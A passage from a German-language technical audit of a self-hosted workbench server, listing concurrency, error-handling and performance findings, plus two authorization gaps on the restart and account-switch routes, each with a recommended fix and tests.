### D-004 `NotesDatabase.update()` ohne Optimistic Locking → Lost Update

**Kategorie:** Logik/Concurrency
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/notes/database.ts:241,285`, `.../notes/routes.ts:60`
**Betroffene Funktionen oder Komponenten:** `NotesDatabase.update()` vs `saveContent()` (Positivbeispiel mit Revisionscheck)
**Problembeschreibung:** `update()` liest, baut `next`, schreibt — ohne `WHERE revision=?`, ohne Transaktion, ohne `expectedRevision` im Contract. Zwei Tabs → Last-Write-Wins. `move()` ruft `update()` in Transaktion, aber ohne Revisionsschutz.
**Technische Ursache:** Inkonsistente Lock-Disziplin (Content ja, Metadaten nein).
**Ausloeser:** 2 Tabs/Geraete, Retry nach Timeout, parallele `move()`+`update()`.
**Beispielszenario:** Tab A setzt `folderId=X`, Tab B setzt `favorite=true` auf altem Stand → Ordnerwahl verloren.
**Auswirkungen:** Datenverlust ohne Fehlermeldung.
**Warum es leicht uebersehen wird:** `saveContent` daneben ist korrekt — sieht nach „abgedeckt" aus.
**Empfohlene Loesung:** `expectedRevision` (nullable fuer Altdaten) + `UPDATE ... WHERE id=? AND revision=?` + `revision+1`; bei Mismatch 409 + Konflikt-Backup wie `saveContent`; Frontend-409-Flow.
**Betroffene Architekturentscheidungen:** Notes-Write-Protokoll.
**Alternativen:** Nur Transaktion ohne Revision — Trade-off: Reihenfolge sicher, Inhalt nicht.
**Trade-offs:** Contract-Aenderung (Altdaten-Flow noetig).
**Implementierungsschritte:** 1. Contract-Feld. 2. Atomares Update. 3. 409+Backup. 4. Client-Flow.
**Tests:** Zwei parallele `update()` gleicher Basis → einer 409; Retry-Idempotenz.
**Akzeptanzkriterien:** Kein stiller Metadatenverlust; 409-Quote messbar.
**Abhaengigkeiten:** Produktentscheid Breaking Change (Abschnitt 15, Frage 2).
**Geschaetzter Umfang:** Medium-Large
**Risiko bei der Umsetzung:** Medium

### D-005 `OrbitDatabase.saveLegacy()` verschluckt 409 → stiller Lost Update

**Kategorie:** Logik/Fehlerbehandlung
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/orbit/database.ts:342,371`, `.../orbit/routes.ts:33`
**Betroffene Funktionen oder Komponenten:** `saveLegacy()` vs `save()`
**Problembeschreibung:** `saveLegacy()` faengt `ORBIT_REVISION_CONFLICT` und gibt `get()` zurueck („Legacy-Clients erwarten aktuellen Entwurf statt 409"). Alt-Client merkt nie, dass sein Save verworfen + als Draft gesichert wurde. UI zeigt „gespeichert", tatsaechlich Fremdstand.
**Technische Ursache:** Kompatibilitaets-Semantik opfert Fehlersignal.
**Ausloeser:** 2 Geraete, eines mit altem Header.
**Beispielszenario:** Geraet A (neu) 100→101; Geraet B (alt) auf 100 → Server legt Draft ab, antwortet 200 mit A-Stand; B ueberschreibt lokal, eigene Edits „verschwunden".
**Auswirkungen:** Verwirrung; Edits nur in `orbit_conflict_backups` (kein UI).
**Warum es leicht uebersehen wird:** 200 + aktueller Stand sieht „erfolgreich" aus.
**Empfohlene Loesung:** Auch Legacy unterscheidbare Antwort (200 + `conflict:true`/`revision` oder tolerierbarer 409-Body); Konflikt-Drafts im UI sichtbar; langfristig Legacy-Pfad entfernen.
**Betroffene Architekturentscheidungen:** Legacy-Sunset (mit A-007).
**Alternativen:** Sofort Legacy entfernen — Trade-off: Alt-Clients brechen hart.
**Trade-offs:** Nur Antwort-Semantik (klein).
**Implementierungsschritte:** 1. Konflikt-Flag. 2. Client-Hinweis. 3. Draft-UI. 4. Sunset-Datum.
**Tests:** Legacy-Save veraltet → Response mit Konflikt-Signal + Draft-Zeile existiert.
**Akzeptanzkriterien:** Kein 200-ohne-Hinweis bei verworfenem Save.
**Abhaengigkeiten:** A-007.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### D-006 Preview `findSharableSession()` N+1/O(n²) unter `BEGIN IMMEDIATE`

**Kategorie:** Logik (Performance + Lock-Haltezeit)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/previews/slots.ts:372,454,514`, `.../previews/database.ts:377,382,388,394`
**Betroffene Funktionen oder Komponenten:** `openSessionOnce`, `allocateSlots`, `findSharableSession`
**Problembeschreibung:** `openSessionOnce` haelt `database.transaction()` und ruft darin `list()` (Slots+Affinitaeten+alle Sessions+Bindings), `allSessions()`, pro Session `bindings()`, pro Binding `affinity()`, `sessionsForSlot()`, pro Fremdsession erneut `bindings()` + Fingerprint. Bei 50 Sessions × 3 Bindings hunderte synchrone Queries unter Lock. Parallele `POST /previews/sessions` warten (`busy_timeout` 5000) oder 409-Retry-Schleife (2 Versuche).
**Technische Ursache:** Read-Phase unter Write-Lock; keine Batch-Abfrage.
**Ausloeser:** Mehrere Tabs/Geraete oeffnen gleichzeitig; Kapazitaetsdruck (`exhausted` → `expirePreviewSessions` in Transaktion).
**Auswirkungen:** Latenz, `SQLITE_BUSY`, unnoetige `PREVIEW_SLOTS_EXHAUSTED`-Retries.
**Warum es leicht uebersehen wird:** Wenige Sessions → schnell; Transaktion „schuetzt", Kosten unsichtbar.
**Empfohlene Loesung:** Sharable-Suche auf eine SQL-Abfrage (Fingerprint/Hash-Spalte oder `GROUP BY`); Read-Phase vor `BEGIN`, nur Write unter Lock + Re-Validierung; Batching.
**Betroffene Architekturentscheidungen:** Slot-Transaktions-Schnitt.
**Alternativen:** Nur Retry-Zahl erhoehen — Trade-off: Symptom.
**Trade-offs:** Lock-Semantik anfassen (mittel).
**Implementierungsschritte:** 1. Kandidatensuche aus Transaktion ziehen. 2. Hash-Spalte/Batch-Query. 3. Re-Validierung unter Lock. 4. Lasttest.
**Tests:** 50 Sessions → Query-Count vorher/nachher; 10 parallele `openSession` → keine Busy-409.
**Akzeptanzkriterien:** Query-Count O(1)/O(slots) statt O(sessions×bindings); P95 unter Last stabil.
**Abhaengigkeiten:** A-004 (Routing-Schicht) danach.
**Geschaetzter Umfang:** Large
**Risiko bei der Umsetzung:** Medium

### D-007 Preview-Storage: `state()`/`snapshots()` unbegrenzt + Vorab-Read ausserhalb Tx

**Kategorie:** Logik
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/previews/storage.ts:61,102,123`, `.../previews/database.ts:551,558,571`
**Betroffene Funktionen oder Komponenten:** `PreviewStorageService.state()/write()`, `writeSnapshot()`
**Problembeschreibung:** `state()` laedt alle Revisionen (`ORDER BY revision DESC`, ohne Limit); `canDecrypt()` entschluesselt `current` bei jedem Call (AES-GCM+Brotli, teuer). `write()` prueft `(expectedRevision ?? 0) !== currentRevision` ausserhalb Tx (doppelter Read; TOCTOU dort abgefangen durch Re-Check in `writeSnapshot`, aber irrefuehrender Vorab-409).
**Technische Ursache:** Kein Limit-Parameter; defensive Doppelpruefung ohne Kennzeichnung.
**Ausloeser:** Viele Revisionen; haeufiges Pollen von `GET /previews/storage/:id`.
**Auswirkungen:** Speicher/CPU, doppelter Read.
**Warum es leicht uebersehen wird:** Re-Check in Tx ist korrekt — Vorab-Read faellt nicht auf.
**Empfohlene Loesung:** `snapshots(user,profile,limit)` + `SELECT MAX(revision)`-Helper; Vorab-Check entfernen oder als Hint markieren; `canDecrypt`-Cache/nur bei Bedarf.
**Betroffene Architekturentscheidungen:** Storage-Read-Schnitt.
**Alternativen:** Nur Limit — Trade-off: Doppel-Read bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Limit-Param. 2. MAX-Helper. 3. Vorab-Check streichen/markieren.
**Tests:** 200 Revisionen → `state()`-Latenz; parallele Writes → genau ein 201, einer 409.
**Akzeptanzkriterien:** `state` O(`maxHistory`), keine Full-History-Loads.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### D-008 `TerminalDatabase.tryReserveSession()` liest Workspace vor `BEGIN`

**Kategorie:** Logik (Race)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** Medium-High
**Betroffene Dateien:** `apps/server/src/terminal/database.ts:233,273,299`
**Betroffene Funktionen oder Komponenten:** `tryReserveSession()`, `getWorkspace()`, `saveWorkspace()`
**Problembeschreibung:** `referencedRuntimeIds()` (via `getWorkspace()`, ggf. mit V1→V2-Migration+Write) laeuft vor `BEGIN IMMEDIATE`. Zwischen Read und `COUNT ... json_each` kann anderer Request Workspace/Sessions aendern → Quota-Fehlentscheidung. (Kommentar nennt Migrations-Grund, laesst TOCTOU offen.)
**Technische Ursache:** Migration im Read-Pfad ausserhalb Lock.
**Ausloeser:** Parallele Terminal-Starts + gleichzeitiger Workspace-Save.
**Auswirkungen:** Faelschlich `kind-limit`/`overall-limit` oder Quota-Umgehung.
**Warum es leicht uebersehen wird:** Kommentar erklaert das Warum — Race-Fenster klein.
**Empfohlene Loesung:** Migration aus Read-Pfad auslagern (einmalig beim Boot/lazy mit eigenem Lock), dann Read in Transaktion; alternativ `INSERT ... SELECT WHERE COUNT...` atomar.
**Betroffene Architekturentscheidungen:** Workspace-Migrationszeitpunkt.
**Alternativen:** Nur Retry — Trade-off: stochastisch.
**Trade-offs:** Migrationspfad anfassen (mittel).
**Implementierungsschritte:** 1. Migration verlagern. 2. Read in Tx. 3. Parallel-Test am Limit.
**Tests:** 2 parallele `tryReserveSession` am Limit → genau einer gewinnt.
**Akzeptanzkriterien:** Quota-Entscheidung immer auf Committed-Stand unter Lock.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### D-009 `AccountService.listWithState()` triggert Writes + Runtime-Restart (Read mit Nebenwirkung)

**Kategorie:** Logik/Fehlerbehandlung
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/usage/account-service.ts:23,85,108,138,158`, `.../usage/codex-runtime.ts:122`
**Betroffene Funktionen oder Komponenten:** `listWithState()`, `repairActiveLinks()`, `reconcileActivationJournal()`, `restartCodexRuntime()`
**Problembeschreibung:** Jeder Listen-Call ruft `reconcileActivationJournal()` → `activateUnlocked()` → `setActivationJournal`, `setActiveAccount`, `switcher.link/rename`, ggf. `restartCodexRuntime()` (systemctl-Restart, Best-Effort-Swallow). `repairActiveLinks()`-Fehler wirft 503 und blockiert das Lesen der Liste.
**Technische Ursache:** Saga im Read-Pfad (Crash-Recovery beim Lesen nachgeholt).
**Ausloeser:** Offenes Journal/ersetzter Symlink; parallele `activate()` (per-Provider serialisiert — gut).
**Beispielszenario:** `GET /accounts` loest `systemctl restart t3-code` aus; Retry-Storms; 503 beim blossen Anzeigen.
**Auswirkungen:** GET mit Seiteneffekt; Restart-Surprise; Lese-Blockade.
**Warum es leicht uebersehen wird:** Recovery „funktioniert" — nur der Ausloeser (Lesen) ist falsch.
**Empfohlene Loesung:** Reconcile/Repair in Boot-Hook + expliziten `POST /accounts/reconcile`/Hintergrundjob; Read nur lesen; Restart-Ergebnis als Feld statt schlucken; Repair-Fehler als Warnung+Status statt 503.
**Betroffene Architekturentscheidungen:** Recovery-Ausloeser (Lesen → Boot/explizit).
**Alternativen:** Nur 503 → Warnung — Trade-off: Seiteneffekt bleibt.
**Trade-offs:** Crash-Recovery-Verhalten erhalten (mittel).
**Implementierungsschritte:** 1. Read seiteneffektfrei. 2. Boot-Hook + explizite Route. 3. Fehler als Status. 4. Test offenes Journal.
**Tests:** `listWithState` mit offenem Journal → keine FS-/systemctl-Seiteneffekte.
**Akzeptanzkriterien:** GET seiteneffektfrei; Saga nur via Boot/explizit.
**Abhaengigkeiten:** S-002 (Admin-Gate) gemeinsam.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Medium

### D-010 `ProjectRegistryDatabase.register()` Check-then-Insert ohne Transaktion

**Kategorie:** Datenintegritaet (Race)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/projects/registry-database.ts:68`, `.../projects/routes.ts:18`
**Betroffene Funktionen oder Komponenten:** `register()`
**Problembeschreibung:** `findByPath()` → `INSERT`. Zwei parallele `POST /projects/register` gleichen Pfads → einer bekommt `UNIQUE(canonical_path)`-500 statt idempotentem `{created:false}`. Deterministische ID (`custom-<slug>-<hash>`) → zweiter INSERT mit gleicher ID = PK-Fehler statt Upsert. Kein `ON CONFLICT`, kein `BEGIN`.
**Technische Ursache:** Fehlende Atomaritaet.
**Ausloeser:** Doppelklick/Retry, zwei Geraete.
**Auswirkungen:** 500 statt 200, verwirrte Clients.
**Warum es leicht uebersehen wird:** Single-Call funktioniert; Race nur bei Doppelklick.
**Empfohlene Loesung:** `INSERT ... ON CONFLICT(canonical_path) DO NOTHING` + danach `findByPath`, oder `BEGIN IMMEDIATE`.
**Betroffene Architekturentscheidungen:** Register-Semantik (idempotent).
**Alternativen:** Client-Dedup — Trade-off: Server bleibt race-anfaellig.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Upsert. 2. Parallel-Test.
**Tests:** 2 parallele `register(samePath)` → beide 200/201, eine Zeile.
**Akzeptanzkriterien:** Idempotentes Register.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### D-011 `OrbitAssetRepository.delete()` loescht Datei vor DB-Zeile (Crash-Luecke)

**Kategorie:** Datenintegritaet (Crash-Sicherheit)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/orbit/assets.ts:257,232,67`
**Betroffene Funktionen oder Komponenten:** `delete()`, `file()`, `reconcileStorage()`
**Problembeschreibung:** `delete()`: `unlink()` → `DELETE`. Crash dazwischen → Zeile zeigt auf fehlende Datei; `file()` wirft 500 `ORBIT_ASSET_MISSING`. `reconcileStorage()` bereinigt nur Dateien ohne DB-Referenz, nicht DB-Zeilen ohne Datei (asymmetrisch). Create-Pfad dagegen vorbildlich (Reservierung+`rename`+Tx).
**Technische Ursache:** Falsche Reihenfolge + einseitige GC.
**Ausloeser:** Kill/Neustart zwischen `unlink` und `DELETE`; parallele Deletes.
**Auswirkungen:** Dauerhafter 500 beim Abruf, manuelle Bereinigung.
**Warum es leicht uebersehen wird:** Happy Path ok; GC-Name klingt nach „bereinigt alles".
**Empfohlene Loesung:** Reihenfolge umkehren (DB-`DELETE` zuerst, dann best-effort `unlink`) oder Tombstone+GC; `reconcileStorage` um DB-Orphan-Check erweitern (fehlende Dateien markieren/bereinigen, definierter 410/404 statt 500).
**Betroffene Architekturentscheidungen:** Delete-Protokoll Assets.
**Alternativen:** Nur GC erweitern — Trade-off: Fenster bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Reihenfolge drehen. 2. Orphan-Check. 3. Kill-Injection-Test.
**Tests:** `unlink`-Mock wirft nach Delete → Zeile weg; fehlende Datei → 410/404 statt 500.
**Akzeptanzkriterien:** Kein Dauer-500 nach Crash.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### D-012 Hermes `offset`-Pagination + `results()`-Fan-out

**Kategorie:** Logik
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/hermes/session-service.ts:48,94`, `.../hermes/routes.ts:39`
**Betroffene Funktionen oder Komponenten:** `listSessions()`, `results()`
**Problembeschreibung:** `offset`-Stil (`nextCursor = String(offset+len)`) statt Cursor: Deep-Offset linear teurer, bei Concurrent-Insert driften Seiten (Duplikate/Luecken). `results()` laedt `limit+20` und filtert in JS (`slice(0,limit)`) — bei vielen irrelevanten Sessions mehrere Runden noetig, aktuell nur eine.
**Technische Ursache:** MVP-Pagination; Filter nicht in Query.
**Ausloeser:** Grosse Historie, Polling.
**Auswirkungen:** Langsame tiefe Seiten, inkonsistente Blaetter.
**Warum es leicht uebersehen wird:** Kleine Historie + `max 1.000.000`-Limit wirken „grosszuegig korrekt".
**Empfohlene Loesung:** Cursor an Dashboard weiterreichen oder serverseitig `(updatedAt,id)`-Cursor; Filter in Query verlagern.
**Betroffene Architekturentscheidungen:** Hermes-Pagination (Dashboard-API-abhaengig).
**Alternativen:** Nur `results()`-Runden erhoehen — Trade-off: teurer.
**Trade-offs:** Dashboard-API-Limit (niedrig-mittel).
**Implementierungsschritte:** 1. Cursor-Spalten. 2. Filter-Query. 3. Blaetter-Test mit Concurrent-Insert.
**Tests:** 500 Sessions, 10× blaettern mit Insert → keine Luecken/Duplikate.
**Akzeptanzkriterien:** Stabile Cursor-Pagination.
**Abhaengigkeiten:** Hermes-Dashboard-API.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low-Medium

### D-013 Inkonsistente Fehlerformate (Hermes/Terminal → anonymes 500)

**Kategorie:** Fehlerbehandlung
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/app/hooks.ts:16`, `.../hermes/client.ts:9`, `.../terminal/Manager.ts`, `.../services/t3Proxy.ts:292`
**Betroffene Funktionen oder Komponenten:** `setErrorHandler`, `HermesClientError(code,status,retryable)`, `TerminalFailure`, WS-`errorCode()`
**Problembeschreibung:** Handler kennt `AppError`, `ZodError`, 429, 4xx, sonst 500. `HermesClientError`/`TerminalFailure` werden generisch verpackt — `code`/`retryable` gehen verloren. WS- und HTTP-Mapping inkonsistent. T3-/Hermes-`fetch` ohne Timeout/Map.
**Technische Ursache:** Zwei Fehlerwelten ohne zentrale Map.
**Ausloeser:** Dashboard-Down, Session-Not-Found, Terminal-Quota.
**Auswirkungen:** Falsche Retries, schlechte UX, Log-Rauschen „Unbehandelter Serverfehler" fuer fachliche Fehler.
**Warum es leicht uebersehen wird:** 500 „funktioniert" als Antwort; `retryable`-Verlust unsichtbar.
**Empfohlene Loesung:** Zentrale `toApiError()`-Map (`HermesClientError`/`TerminalFailure`/`SQLITE_BUSY` → 429/503 `retryable:true`); WS-/HTTP-Mapping aus einer Funktion; `fetch`-Stellen mit Timeout+Map.
**Betroffene Architekturentscheidungen:** Fehler-Taxonomie.
**Alternativen:** Nur neue Faelle mappen — Trade-off: Alt-Inkonsistenz bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Map-Funktion. 2. Handler + WS nutzen sie. 3. Timeouts. 4. Matrix-Tests.
**Tests:** Jede Fehlerklasse → Status+`code`+`retryable` ueber HTTP.
**Akzeptanzkriterien:** Kein fachlicher Fehler mehr als anonymes 500.
**Abhaengigkeiten:** Q-004 (`requestId`-Anzeige) gemeinsam.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low

### D-014 Best-effort-`catch` ohne Kontext (Sync-Ergebnisse still verworfen)

**Kategorie:** Fehlerbehandlung
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/usage/usage-service.ts:47`, `.../adapters/opencode/opencode-usage.ts:14`, `.../hermes/result-sync.ts:58,189`, `.../notifications/t3-status-sync.ts:178,248,277`, `.../notifications/agent-session-sync.ts:96,103`, `.../orbit/assets.ts:47`
**Betroffene Funktionen oder Komponenten:** Sync-Coordinator (`Promise.allSettled`), `readOpenCodeUsage()`, Cursor-/DB-Lesepfade
**Problembeschreibung:** „Fehler eines Zweigs beendet den anderen nicht" (korrekt) wird zu „Fehler nirgends sichtbar": Rejections weder im Log noch in Metrik/`sync/status`. `readOpenCodeUsage(): null` unterscheidet „keine DB" vs „korrupt/gesperrt" nicht. Leere `catch {}` verbergen Migrationsschaeden.
**Technische Ursache:** Fehlende Fehler-Sichtbarkeit (kein `lastError`-pro-Zweig).
**Ausloeser:** CLI-Timeout, gesperrte DB, Dashboard-Down.
**Auswirkungen:** Veraltete Daten ohne Hinweis; Diagnose blind.
**Warum es leicht uebersehen wird:** „Best effort" klingt robust; Erfolgspfad gruen.
**Empfohlene Loesung:** `sync/status` um `lastError`-pro-Zweig (Basis `running/lastCompletedAt` in `sync-coordinator.ts:12` vorhanden); `readOpenCodeUsage` → `{ok,reason}`; `catch`-Stellen mit `warn` + Zaehler.
**Betroffene Architekturentscheidungen:** Sync-Observability.
**Alternativen:** Nur Logging — Trade-off: UI bleibt blind.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Status-Felder. 2. `{ok,reason}`. 3. Warn+Metrik. 4. Timeout-Simulationstest.
**Tests:** CLI-Timeout → `sync/status` zeigt Fehler + Alter.
**Akzeptanzkriterien:** Kein stiller Vollausfall eines Zweigs.
**Abhaengigkeiten:** Abschnitt 12 (Observability).
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### D-015 Restart/Update: keine Idempotenz, keine Log-Rotation, 1-h-Stale-Fenster

**Kategorie:** Logik/Fehlerbehandlung
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/system/restart.ts:126,136,165`, `.../system/routes.ts:88`, `.../system/update.ts`
**Betroffene Funktionen oder Komponenten:** `STALE_RESTART_MS`, `acquireRestartLock`, `triggerRestart`
**Problembeschreibung:** Doppel-`POST` → 409 (gut), aber Retry nach Timeout ununterscheidbar („laeuft noch" vs „abgebrochen") — kein Key, kein Job-Handle. `STALE_RESTART_MS=1h`: haengendes Skript blockiert 1 h alles. Logs (`restart-*.log`, `last-status.json`) ohne Rotation. Spawn-Erfolg ≠ fertig (Client muss `bootId`/`webBuildId` pollen — dokumentiert, leicht falsch nutzbar).
**Technische Ursache:** Fehlende Job-Semantik + Retention.
**Ausloeser:** Doppelklick, Reload waehrend Restart, haengendes Build-Skript.
**Auswirkungen:** Blockierte Neustarts, Platten-Wachstum, unsichere Retries.
**Warum es leicht uebersehen wird:** 409 wirkt „idempotent"; 1 h nur im Haengefall sichtbar.
**Empfohlene Loesung:** Client-`Idempotency-Key` (gleicher Key → gleicher `jobId`); Log-Rotation (7 Tage/100 MB, wie Diagnostik); Stale-Fenster verkuerzen + Heartbeat; `status` um `bootIdChanged/webBuildIdChanged` ergaenzen.
**Betroffene Architekturentscheidungen:** Restart-Job-Modell.
**Alternativen:** Nur Rotation — Trade-off: Retry-Problem bleibt.
**Trade-offs:** Niedrig-mittel (Systempfad).
**Implementierungsschritte:** 1. Key+JobId. 2. Rotation. 3. Heartbeat/kleineres Fenster. 4. Status-Felder.
**Tests:** Doppel-POST gleichen Keys → 1 Job; haengendes Skript → Freigabe; Rotation.
**Akzeptanzkriterien:** Sichere Retries, begrenztes Log-Volumen.
**Abhaengigkeiten:** A-009.
**Geschaetzter Umfang:** Medium
**Risiko bei der Umsetzung:** Low-Medium

### D-016 Audit-Write kostet Delete-Scan pro Mutation + `verify()`-Vollscan

**Kategorie:** Logik (Performance)
**Schweregrad:** Medium
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/observability/audit.ts:63,95,166`, `.../app/hooks.ts:69`, `.../app/routes.ts:66`
**Betroffene Funktionen oder Komponenten:** `insertRow()`, `verify()`, `onResponse → recordDurable`
**Problembeschreibung:** Jede auditierte Mutation: `BEGIN IMMEDIATE` + `SELECT MAX` + `INSERT` + `DELETE NOT IN (SELECT ... LIMIT 10000)` — Full-Delete-Scan pro Request. `verify()` hasht ≤10k Zeilen (5-s-Cache, danach Vollscan je `operational-metrics`-Poll). Live 3.675 Rows noch ok, waechst pro Mutation. `flushOutbox()` beim Start synchron.
**Technische Ursache:** Retention im Request-Pfad statt Hintergrundjob.
**Ausloeser:** Burst-Mutationen (Autosave, Syncs).
**Auswirkungen:** Write-Amplification; DB-Lock konkurriert mit naechster Mutation.
**Warum es leicht uebersehen wird:** `onResponse` (nicht blockierend fuer Response) versteckt Kosten.
**Empfohlene Loesung:** Bereinigung in Hintergrundjob (1×/h oder >11k); `verify()`-Cache erhoehen/inkrementell; Outbox-Flush limitieren.
**Betroffene Architekturentscheidungen:** Audit-Retention-Timing.
**Alternativen:** Nur Cache erhoehen — Trade-off: Write-Scan bleibt.
**Trade-offs:** Gering.
**Implementierungsschritte:** 1. Job-Auslagerung. 2. Cache/inkrementell. 3. Flush-Limit. 4. Burst-Bench.
**Tests:** 1k Mutationen Burst → P95 vorher/nachher.
**Akzeptanzkriterien:** Audit-Overhead <5 % der Mutationslatenz.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small-Medium
**Risiko bei der Umsetzung:** Low

### D-017 Kleinere Backend-Befunde (Sammelposten)

**Kategorie:** Datenintegritaet/Logik
**Schweregrad:** Medium (einzeln Small)
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien/Funktionen:** 1. `apps/server/src/orbit/database.ts:92` (kein `PRAGMA foreign_keys=ON`, aktuell folgenlos da keine FKs). 2. Legacy-Preview-Tabellen `preview_sessions_v1` (3 Rows live)/`preview_session_bindings_v1` (3) ohne Cleanup/Rollback-Pfad (Migration v3 benennt nur um). 3. `apps/server/src/extensions/database.ts:290` `decodeExtension()` schreibt Quarantaene-`INSERT` im Lese-Pfad (`listExtensions()`). 4. `apps/server/src/usage/database.ts:70` `migrate()` Accounts-Rebuild mit `BEGIN` statt `IMMEDIATE`, ohne Fehlerbehandlung → `SQLITE_BUSY`-500 bei parallelem Boot/Sync. 5. Timestamps inkonsistent: Terminal `INTEGER`-Millis (`terminal/database.ts:117`) vs Rest ISO-TEXT. 6. `apps/server/src/services/t3Proxy.ts:292` Health-`fetch` ohne Timeout.
**Problembeschreibung/Loesung je:** 1. Eine Zeile + Test. 2. Dokumentierte Loeschung nach N Versionen oder Drop hinter Flag. 3. Markierung in Schreibpfad/`reconcile` verlagern. 4. `BEGIN IMMEDIATE` + Retry. 5. Konvention dokumentieren + Helper. 6. `AbortSignal.timeout` wie Hermes-Client.
**Tests:** Je Einzeiler-Assert (FK-Test, v1-Drop-Plan, Read-ohne-Write-Assert, paralleler Boot, Timestamp-Helper, Timeout-Test).
**Akzeptanzkriterien:** Alle sechs geschlossen oder mit Ticket + Datum versehen.
**Geschaetzter Umfang:** Small (gesamt)
**Risiko bei der Umsetzung:** Low

### 4b. Detailed Findings — Security und Performance (S, P, B)

### S-001 Fehlende Admin-Pruefung: System-Neustart/Update (vertikale Eskalation)

**Kategorie:** Security (AuthZ)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/system/routes.ts:88-118`, `.../system/restart.ts:165-239`, `.../system/update.ts:1-165`, `apps/server/src/security/workbench-identity.ts:109-125` (`requireWorkbenchAdmin` existiert, wird hier nicht genutzt)
**Betroffene Funktionen oder Komponenten:** `POST /api/v1/system/restart`, `GET /api/v1/system/restart/status`, `POST /api/v1/system/update`, `GET /api/v1/system/update/status`
**Problembeschreibung:** Jeder `allowedUsers`-Eintrag kann Backend/Frontend-Restarts und Updates ausloesen. Keine Admin-Pruefung (im Gegensatz zu `/extensions/:id/operations`, `/plugins/*`).
**Technische Ursache:** Single-Hook-Auth ohne Rollendifferenzierung auf System-Routen; `registerSystemRoutes` fehlt der `identityOptions`-Parameter (`api/routes.ts:13` vs `system/routes.ts:33`).
**Ausloeser:** Authentisierter Non-Admin sendet `{"target":"both"}`.
**Beispielszenario:** Gast-Account triggert waehrend aktiver Arbeit Restart → detached `restart-all.sh` → Dienst-Neustart, Build-Last, `bootId`-Wechsel. Wiederholbar (Limit nur 3/min).
**Auswirkungen:** Verfuegbarkeit (DoS), Build-Ressourcen, erzwungener T3-Kanalwechsel (S-003), Log-Spam.
**Warum es leicht uebersehen wird:** Single-User-Setup: einziger User ist implizit Admin.
**Empfohlene Loesung:** `requireWorkbenchAdmin` in `POST /system/restart`, `POST /system/update` (GET lesend lassen oder ebenfalls admin-only); `identityOptions` durchreichen; E2E-Test 403.
**Betroffene Architekturentscheidungen:** Rollenmodell System-Routen (Admin-Fallback `allowedUsers[0]` bei leerer `adminUsers` dokumentieren).
**Alternativen:** Rate-Limit verschaerfen (3/min → 1/10min) — Trade-off: drosselt, loest Eskalation nicht.
**Trade-offs:** Single-User unberuehrt; Multi-User braucht Admin-Liste.
**Implementierungsschritte:** 1. `identityOptions` durchreichen. 2. Guard einbauen. 3. Audit-Eintrag mit Actor-Hash. 4. E2E 403/202.
**Tests:** Non-Admin → 403 `WRAPT_ADMIN_REQUIRED`; Admin → 202.
**Akzeptanzkriterien:** Non-Admin kann weder Restart noch Update ausloesen.
**Abhaengigkeiten:** Keine.
**Geschaetzter Umfang:** Small
**Risiko bei der Umsetzung:** Low

### S-002 Serverweiter KI-Account-Switch ohne Admin

**Kategorie:** Security (AuthZ, horizontale/vertikale Eskalation)
**Schweregrad:** High
**Sicherheit der Einschaetzung:** High Confidence
**Betroffene Dateien:** `apps/server/src/usage/routes.ts:61-66`, `scripts/ki-account.sh:88-122`, `apps/server/src/config/settings.ts:133-135`
**Betroffene Funktionen oder Komponenten:** `POST /api/v1/accounts/:accountId/activate`, `POST /api/v1/accounts/login-session`
**Problembeschreibung:** Jeder erlaubte Benutzer schaltet den serverweit aktiven Codex-/Claude-/OpenCode-Account um (Symlink von `auth.json`/`.credentials.json` im gemeinsamen Home). Alle danach gestarteten Prozesse nutzen ihn. Kein Bestaetigungs-Flow.
**Technische Ursache:** Globales Singleton-Modell ohne Rollen.
**Ausloeser:** `POST /accounts/<uuid>/activate` als Non-Admin.
**Beispielszenario:** B aktiviert privaten Account → alle danach von A gestarteten Terminals laufen unter B-Abrechnung; Kosten-/Verlaufs-Zuordnung falsch (laufende behalten alten, neue wechseln — inkonsistent).
**Auswirkungen:** Abrechnungs-Manipulation, Identitaetsverwechslung, persistente Fehlzuordnung.
**Warum es leicht uebersehen wird:** UI zeigt „aktiver Account" ohne „serverweit"-Hinweis.
